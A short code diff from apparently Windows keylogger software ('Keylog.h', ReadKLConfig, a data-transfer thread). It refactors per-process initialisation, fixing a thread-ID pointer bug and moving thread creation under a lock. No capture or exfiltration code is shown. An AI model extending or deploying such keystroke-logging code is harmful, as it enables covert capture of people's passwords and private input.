@@ -3,7 +3,7 @@
 #include "..\..\..\Include\Keylog.h"
 
 KLPROCESSDATA			TempProcessData;
-LPDWORD					lpDataTransferThreadID;
+DWORD					dataTransferThreadID;
 HANDLE					lpDataTransferThread;
 
 HANDLE					hReadNewConfigThread;					// handle of the InitHookProc thread(hInitThread) and ReadKLConfigThread thread(hReadNewConfigThread)
@@ -26,22 +26,16 @@ extern	WCHAR	CurrentDirectory[MAX_PATH + 1];
 
 BOOL InitProcess()
 {
-    BOOL funcRetVal = FALSE;
-
-    if (fInitDone == FALSE)
-    {
-        lpDataTransferThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TransferLinkListData, NULL, 0, lpDataTransferThreadID);
-        if (lpDataTransferThread == NULL)
-            return FALSE;
-    }
-
     __try
-    {														// thread in each process for loading configration
+    {
         EnterCriticalSection(&csAppInit);
-
         if (fInitDone == FALSE)
         {
-            funcRetVal = ReadKLConfig();					// called only the 1st time a key is received from a process..
+            lpDataTransferThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TransferLinkListData, NULL, 0, &dataTransferThreadID);
+            if (lpDataTransferThread == NULL)
+                return FALSE;
+
+            BOOL funcRetVal = ReadKLConfig();
             if (funcRetVal == FALSE)
                 return FALSE;
 
@@ -49,13 +43,12 @@ BOOL InitProcess()
             if (hReadNewConfigThread == NULL)
                 return FALSE;
         }
-
-        return TRUE;
     }
     __finally
     {
         LeaveCriticalSection(&csAppInit);
     }
+    return TRUE;
 }
 
 BOOL ReadKLConfig()
